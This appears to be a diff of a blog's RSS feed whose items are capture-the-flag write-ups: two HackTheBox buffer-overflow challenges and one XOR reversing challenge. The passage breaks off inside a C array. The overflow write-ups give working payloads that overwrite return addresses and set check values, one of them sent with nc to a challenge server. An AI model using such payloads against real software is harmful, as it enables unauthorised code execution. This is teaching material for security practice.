@@ -1,27 +1,936 @@
----
-layout: null
----
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>{{ site.title | xml_escape }}</title>
-    <description>{{ site.description | xml_escape }}</description>
-    <link>{{ site.url }}</link>
-    <atom:link href="{{ site.url }}/feed.xml" rel="self" type="application/rss+xml" />
+    <title>Dennis Blog</title>
+    <description>A Jekyll Blog Theme For Hackers</description>
+    <link></link>
+    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
     <author>
-      <name>{{ site.author.name }}</name>
-      <email>{{ site.author.email }}</email>
-      <uri>{{ site.author.url }}</uri>
+      <name>Dennis</name>
+      <email>d.feldbusch@web.de</email>
+      <uri>https://www.github.com/DennisFeldbusch</uri>
     </author>
-    {% for post in site.posts limit:10 %}
+    
       <item>
-        <title>{{ post.title | xml_escape }}</title>
-        <description>{{ post.content | xml_escape }}</description>
-        <pubDate>{{ post.date | date: "%a, %d %b %Y %H:%M:%S %z" }}</pubDate>
-        <link>{{ site.url }}/{{ post.url }}</link>
-        <link href="{{ site.url }}{{ post.url }}"/>
-        <guid isPermaLink="true">{{ site.url }}{{ post.url }}</guid>
+        <title>You know 0xDiablos HackTheBox</title>
+        <description>&lt;h1 id=&quot;you-know-0xdiablos&quot;&gt;You know 0xDiablos&lt;/h1&gt;
+&lt;h2 id=&quot;challenge-description&quot;&gt;challenge description&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;I missed my flag&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;trying-a-large-input-to-cause-an-overflow&quot;&gt;trying a large input to cause an overflow&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;by executing the binary with a large input delivers us a segmentation fault&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print &apos;A&apos; * 300 &quot;&lt;/span&gt; | ./vuln
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;37978 segmentation fault (core dumped)  ./vuln&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;investigating-the-error&quot;&gt;investigating the error&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;by debugging the binary with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt; and the same input we get the following error message: Cannot access memory at address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41414141&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;this is the part of the input which overwrites the return pointer which is restored when the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; functions returns the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;next we can use an unique pattern to get the exact part of the input which overflows&lt;/li&gt;
+  &lt;li&gt;using this pattern: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9&lt;/code&gt; results in the following error: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cannot access memory at address 0x33674132&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;calculating the offset results in: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;188&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: the memory address is in little-endian&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;crafting-the-payload&quot;&gt;crafting the payload&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;in order to print the contents of of the flag we have to manipulate the callflow to call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function at address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80491e2&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print &apos;A&apos; * 188 + &apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos;&quot;&lt;/span&gt; | ./vuln
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;results in:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You know who are 0xDiablos:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Hurry up and try in on server side.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hurray!!! Lets test it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print &apos;A&apos; * 188 + &apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos;&quot;&lt;/span&gt; | nc 165.232.98.156 30180
+
+You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;no flag … let’s investigate&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;fix-callflow&quot;&gt;fix callflow&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;by checking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function we have to pass three checks in order to simulate the envionment on the server and print the flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;there have to be a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; 
+&lt;img src=&quot;../assets/youknow-file-existence.png&quot; alt=&quot;file existence&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rbp+0x8&lt;/code&gt; has to be equal to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;
+&lt;img src=&quot;../assets/youknow-deadbeef-check.png&quot; alt=&quot;deadbeef check&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rbp+0xc&lt;/code&gt; has to be equal to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xc0ded00d&lt;/code&gt;
+&lt;img src=&quot;../assets/youknow-c0ded00d-check.png&quot; alt=&quot;c0ded00d check&quot; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;luckily we can manipulate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rbp+0x8&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rbp+0xc&lt;/code&gt; by extending the input:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print &apos;A&apos; * 188 + &apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos; + &apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;44&apos; + &apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&apos; + &apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&apos;&quot;&lt;/span&gt; | nc 165.232.98.156 30180
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;we get the flag&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Mon, 13 Mar 2023 00:00:00 +0000</pubDate>
+        <link>//You-know-0xDiablos</link>
+        <link href="/You-know-0xDiablos"/>
+        <guid isPermaLink="true">/You-know-0xDiablos</guid>
       </item>
-    {% endfor %}
+    
+      <item>
+        <title>Space Pirate Going Deeper HackTheBox Challenge</title>
+        <description>&lt;h1 id=&quot;space-pirate-going-deeper&quot;&gt;Space Pirate: Going Deeper&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. Can you disable the mechanisms and take control of the Admin Panel?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;inspecting-the-exec-file&quot;&gt;inspecting the exec file&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;get infos about the executable by running:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;checksec &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sp_going_deeper
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/checksec.png&quot; alt=&quot;Checksec&quot; title=&quot;Checksec Result&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;by inspecting the result of checksec we can see that
+    &lt;ol&gt;
+      &lt;li&gt;the stack is not executable -&amp;gt; NX enabled
+        &lt;blockquote&gt;
+          &lt;p&gt;NX stands for “non-executable.” It’s often enabled at the CPU level, so an operating system with NX enabled can mark certain areas of memory as non-executable. Often, buffer-overflow exploits put code on the stack and then try to execute it. However, making this writable area non-executable can prevent such attacks. This property is enabled by default during regular compilation using gcc: &lt;sup&gt;&lt;a href=&quot;#nx&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+        &lt;/blockquote&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Position Independant Executable (PIE) is disabled
+        &lt;blockquote&gt;
+          &lt;p&gt;Disabling PIE means that the program’s base address will always be the same at each execution&lt;/p&gt;
+        &lt;/blockquote&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;callflow&quot;&gt;callflow&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;main
+    &lt;ol&gt;
+      &lt;li&gt;setup&lt;/li&gt;
+      &lt;li&gt;banner&lt;/li&gt;
+      &lt;li&gt;admin_panel&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;goal&quot;&gt;goal&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;the goal is to access this part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin_panel&lt;/code&gt; function which prints out the flag file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/goal.png&quot; alt=&quot;Goal function&quot; title=&quot;goal function&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;requirements&quot;&gt;requirements&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;select option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;input any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt;or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt; (depends on the previously selected option)&lt;/li&gt;
+  &lt;li&gt;the following three screenshots are showing checks to validate if particular memory segments are equal to the hexvalues: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1337c0de&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1337beef&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/deadbeef.png&quot; alt=&quot;deadbeef check&quot; title=&quot;deadbeef&quot; /&gt;
+&lt;img src=&quot;../assets/1337c0de.png&quot; alt=&quot;1337c0de check&quot; title=&quot;1337c0de&quot; /&gt;
+&lt;img src=&quot;../assets/1337beef.png&quot; alt=&quot;1337beef check&quot; title=&quot;1337beef&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;finally this check has to be passed&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/string-cmp.png&quot; alt=&quot;string compare&quot; title=&quot;string compare&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;limitations&quot;&gt;limitations&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;we can’t pass the three checks because we can’t manipulate the given memory segments&lt;/li&gt;
+  &lt;li&gt;through this we would never get to the intended section which prints out the flag file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;idea&quot;&gt;idea&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;by overwriting the return address of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin_panel&lt;/code&gt;function we can change the call flow&lt;/li&gt;
+  &lt;li&gt;through this indeed all checks would fail but when the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin_panel&lt;/code&gt;function would return to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;function the overwritten return address would be loaded into the instruction pointer which would then be executed&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;solution&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;by injecting overflowing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt; we can overwrite the return address&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;print(&apos;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; + &apos;A&apos; * 85 + &apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x12\x0B\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sp_going_deeper&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;the command prints a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;followed by a line break to select option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;in the menu&lt;/li&gt;
+  &lt;li&gt;subsequently it prints 85 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt;’s to reach the overflow followed by the address to be executed when returning to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: the adress is in little-endian format which results in the following code address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400B12&lt;/code&gt;
+Note2: the string cannot contain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0A&lt;/code&gt; since the input is null-terminated&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;sources&quot;&gt;Sources&lt;/h1&gt;
+&lt;p&gt;&lt;a name=&quot;nx&quot;&gt;1&lt;/a&gt;: &lt;a href=&quot;https://opensource.com/article/21/6/linux-checksec&quot;&gt;checksec&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 12 Mar 2023 00:00:00 +0000</pubDate>
+        <link>//Space-pirate-Going-Deeper</link>
+        <link href="/Space-pirate-Going-Deeper"/>
+        <guid isPermaLink="true">/Space-pirate-Going-Deeper</guid>
+      </item>
+    
+      <item>
+        <title>Lego Car Generator CTF Challenge</title>
+        <description>&lt;h1 id=&quot;lego-car-generator-350-pts&quot;&gt;Lego Car Generator (350 pts)&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;I encypted the flag with this &lt;a href=&quot;https://github.com/DennisFeldbusch/CTFs/blob/main/Reversing/LegoCarGenerator/encrypter&quot;&gt;program&lt;/a&gt; into &lt;a href=&quot;https://github.com/DennisFeldbusch/CTFs/blob/main/Reversing/LegoCarGenerator/secret&quot;&gt;secret&lt;/a&gt;. But then I accidentally lost the original file! Can you help me recover the flag please?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;general&quot;&gt;General&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Given a binary(&lt;a href=&quot;https://github.com/DennisFeldbusch/CTFs/blob/main/Reversing/LegoCarGenerator/encrypter&quot;&gt;encrypter&lt;/a&gt;) and a hexfile(&lt;a href=&quot;https://github.com/DennisFeldbusch/CTFs/blob/main/Reversing/LegoCarGenerator/secret&quot;&gt;secret&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;By inspecting the binary with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump -d encrypter &amp;gt; encrypter.s&lt;/code&gt; and inspecting with &lt;a href=&quot;https://hex-rays.com/ida-free/&quot;&gt;IDA&lt;/a&gt; you can see at address 0x12BD the current char is XORed with the appropriate byte of the “hash”&lt;/li&gt;
+  &lt;li&gt;every 4th time (see. address 0x12D2 -&amp;gt; modulo) the “hash” is newly calculated which is within the rngNext32 function&lt;/li&gt;
+  &lt;li&gt;because of the given start of the flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ractf{&lt;/code&gt; and the given secret I calculated the then called start by XORing them:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ractf{ =&amp;gt; 72 61 63 74 66 7b
+secret =&amp;gt; b6 4a 9e 78 de 86
+---------------------------
+start  =&amp;gt; C4 2B FD 0C B8 FD
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Because the start is only 4 Bytes (see. EAX vs. RAX&lt;sup&gt;&lt;a href=&quot;#registers&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;) I only need the first four Bytes&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;with these information I created a little c-tool which give me the flag&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC42BFD0C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xB6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xde&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xaa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xe9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x82&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x91&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x94&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span 